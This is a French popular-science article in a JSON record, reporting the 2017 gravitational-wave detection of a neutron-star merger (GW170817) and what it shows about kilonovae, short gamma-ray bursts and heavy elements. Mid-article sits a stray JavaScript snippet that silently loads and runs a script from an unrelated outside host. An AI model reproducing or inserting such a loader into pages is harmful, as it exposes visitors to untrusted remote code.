{"title": "Ondes gravitationnelles : grande première avec l'observation d'une fusion d'étoiles à neutrons", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "16/10/2017", "content": "Spectaculaire révélation venue de Ligo, de Virgo, de l'ESA et de l'ESO : des ondes gravitationnelles détectées le 17 août 2017 provenaient de la fusion d'étoiles à neutrons, et non de trous noirs. Mieux : l'évènement a été repéré aussi par 70 instruments, spatiaux et terrestres, dans le visible, l'infrarouge et le domaine gamma, ce qui en fait une observation « multimessagers ». Au passage, il confirme que ce genre de collision est bien à l'origine des énigmatiques « sursauts gamma courts ». La découverte ouvre une nouvelle ère : celle de l'astronomie gravitationnelle couplée au travail d'instruments classiques. Et pourquoi pas aussi à la détection de neutrinos ? Ce qu'il faut retenir Dans la zone du ciel d'où provenaient les ondes gravitationnelles detéctées par Ligo et Virgo le 17 août dernier, des instruments du monde entier ont identifié une source d'ondes électromagnétiques, dans le visible notamment, située dans la galaxie NGC 4993, à 130 millions d'années-lumière. L'évènement est important sur le plan technique car deux signaux, issus du même phénomène mais de natures différentes (ondes gravitationnelles et ondes électromagnétiques), ont été observés. Scientifiquement, il confirme que les sursauts gamma courts (ou au moins certains d'entre eux) sont bien engendrés par des fusions d'étoiles à neutrons, que les « kilonovae » existent et que là se trouve la source d'atomes lourds comme l'or ou le platine. La nouvelle était tellement extraordinaire que l'astrophysicien J. Craig Wheeler, de l'université du Texas à Austin (là où enseignait la regrettée  Cécile DeWitt-Morette ), n'avait pas pu tenir sa langue le 18 août 2017 sur  Twitter . Non seulement les détecteurs d'ondes gravitationelles  Ligo  et  Virgo  avaient vu une nouvelle source mais, selon les rumeurs entendues par Wheeler, il existait en prime des observations de cet évènement dans le  spectre  électromagnétique. Bien que non confirmée, la nouvelle s'était rapidement propagée dans la communauté scientifique au point de donner lieu à un article dans la revue  Nature . Il semblait bien que plusieurs  télescopes , dont  Hubble , dans le visible, ainsi que  Fermi  et  Chandra  dans les domaines gamma et X, respectivement, aient été mobilisés pour observer la  galaxie  NGC 4993, située à 130 millions d' années-lumière  de la  Voie lactée  dans la  constellation  de l' Hydre  de l' hémisphère austral .  Une chose était certaine : Chandra avait bien observé dans cette galaxie un  sursaut gamma court  initialement détecté par Fermi, en l'occurrence SGRB170817A, qui était survenu le 17 août 2017, comme son nom l'indique (GRB veut dire  Gamma Ray Burst , donc sursaut gamma en anglais). Les astrophysiciens pensent depuis un moment que les  sursauts  gamma courts sont probablement des «  kilonovae  », des petites supernovae en quelque sorte mais générées par des collisions d' étoiles à neutrons . Or, ces collisions sont précisément les sources d' ondes gravitationnelles  que l'on pensait détecter en premier avec Ligo et Virgo. En effet, bien que ces collisions soient moins puissantes en intensité que celles de  trous noirs stellaires , elles sont censément plus fréquentes. Une vidéo de présentation de Virgo et de la chasse aux ondes gravitationnelles. © CNRS Calculs et observations convergent vers deux étoiles à neutrons Cependant, l'annonce de la détection conjointe par Ligo et Virgo le 14 août 2017 de  GW170814  (GW, pour  Gravitational Wave , c'est-à-dire onde gravitationnelle), un signal provenant à nouveau d'une  fusion  de  trous noirs  stellaires mais sans contrepartie électromagnétique, semblait avoir mis fin à toutes les rumeurs. Erreur, comme le prouve aujourd'hui une salve de communiqués provenant des collaborations Ligo et Virgo mais aussi des astronomes de l' ESO  et de l' ESA . Avec le  VLT  et  Integral , ces derniers annoncent que SGRB170817A semble bel et bien accompagner une nouvelle source d'ondes gravitationnelles que les observations de Ligo et Virgo permettent de localiser dans l'espace et dans le temps avec  NGC  4993.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Baptisée GW170817, elle a été détectée directement sur  Terre  le 17 août 2017 précisément à 14 heures 41 minutes (heure de Paris). Le signal détecté est bien trop long — une centaine de secondes — pour avoir été produit par une fusion de  trous noirs  (il n'aurait duré qu'une fraction de seconde). Il s'agissait nécessairement d' astres  moins massifs et moins compacts, émettant moins intensément et moins rapidement de l' énergie  sous forme d'ondes gravitationnelles. De ce fait, l'ultime phase de rapprochement des deux objets est moins rapide, ce qui allonge d'autant la  durée  de forte  luminosité  gravitationnelle. Là aussi, notamment grâce à des  simulations numériques  sur  superordinateurs , il est possible de remonter de la forme de l'onde gravitationnelle aux caractéristiques des astres compacts qui l'ont produite lors d'une collision et d'une fusion. Ainsi, la catastrophe cosmique survenue dans NGC 4993 résulte de la collision de deux étoiles à neutrons contenant vraisemblablement respectivement entre 1,1 et 1,6  masse  solaire. Le saviez-vous ? Les étoiles à neutrons sont petites (quelques dizaines de kilomètres) mais aussi massives qu'une étoile et vivent parfois en couple. Les deux peuvent alors finir par se rapprocher et entrer en collision, émettant une puissante émission électromagnétique dans tout le spectre. Prédit théoriquement et probablement assez fréquent, ce phénomène n'avait jamais été observé. L'hypothèse était qu'il correspondait à des sursauts gamma courts, ces brèves bouffées de rayons gamma qui se manifestent au rythme d'un par semaine dans notre ciel. Futura avait consacré deux articles aux étoiles à neutrons, dont un entretien avec Éric Gourgoulhon, un des grands spécialistes français. Ces objets fascinants sont des résidus possibles de l'évolution stellaire des  soleils  contenant plus de huit masses solaires et qui explosent en supernovae. Ces astres peuvent concentrer entre une et trois masses solaires dans une sphère de quelques dizaines de kilomètres de diamètre, riche en noyaux de  fer  et en neutrons. Nous renvoyons le lecteur vers ces articles pour faire connaissance plus en profondeur avec les étoiles à neutrons, dont l'étude convoque presque toute la  physique  et qui, en retour, fournissent un formidable laboratoire naturel de physique fondamentale. Voir aussi : Record de masse pour une étoile à neutrons Voir aussi : Un peu moins de mystères dans le cœur des étoiles à neutrons Pour la physique des ondes gravitationnelles et leur détection, nous renvoyons aux commentaires de  Jean-Pierre Luminet  sur son  blog  hébergé chez Futura :  Voir aussi : Toute la lumière sur l'onde gravitationnelle avec Jean-Pierre Luminet Des explications pour les kilonovae, les sursauts gamma courts, l'or et le platine... GW170817 et SGRB170817A sont donc les deux faces d'une même découverte aux multiples conséquences. Elle confirme déjà l'entrée dans une nouvelle ère, celle de l'astronomie gravitationnelle. Elle ouvre aussi une nouvelle phase de astronomie « multi-messagers » déjà inaugurée par la détection conjointe des  photons  et des  neutrinos  de la fameuse  supernova  de 1987. On peut penser que dans un avenir rapproché, par exemple à l'occasion d'une collision similaire d'étoiles à neutrons ou de l'explosion d'une supernova donnant un  trou noir  dans la Voie lactée, trois messagers pourront être combinés : les ondes gravitationnelles, les  ondes électromagnétiques  et les neutrinos. Qui sait quelles percées révolutionnaires en physique et en  astrophysique  pourraient en découler ? Pour l'heure, et pour la première fois, nous avons une preuve  solide  de l'existence des kilonovae et surtout du fait qu'au moins certains sursauts gamma courts sont bien des collisions d'étoiles à neutrons. Cela accrédite donc un scénario proposé pour rendre compte d'une énigme de l'astrophysique nucléaire, celles des abondances de noyaux d'or et de  platine  difficiles à expliquer par la seule évolution cosmochimique des éléments lourds dans les galaxies basée sur les supernovae. Ces noyaux proviendraient bien de l'addition rapide de neutrons dans des noyaux de plus en plus lourds à partir des noyaux de fer, donnant parfois des  protons  par  désintégration bêta . Une dizaine de publications va accompagner cette découverte, donnant la mesure de la justesse de l'attribution du  prix Nobel de physique 2017  aux physiciens états-uniens Rainer Weiss, Kip S. Thorne et Barry C. Barish et dont il serait étonnant qu'elles ne contribuent pas à l'attribution du prix pour 2018 aux Français  Alain Brillet et Thibault Damour . Interview : comment mesurer les ondes gravitationnelles ?                       Les ondes gravitationnelles sont des déformations de l’espace-temps prédites par Einstein. Il serait possible de les mesurer avec des outils appropriés. L’éditeur littéraire Dunod a interviewé Pierre Binétruy, professeur au laboratoire Astroparticule et Cosmologie de l'université Paris Diderot, afin d’en savoir plus sur ces mystérieuses ondes et sur la façon dont on pourrait les détecter.                                       ", "theme": "sciences"}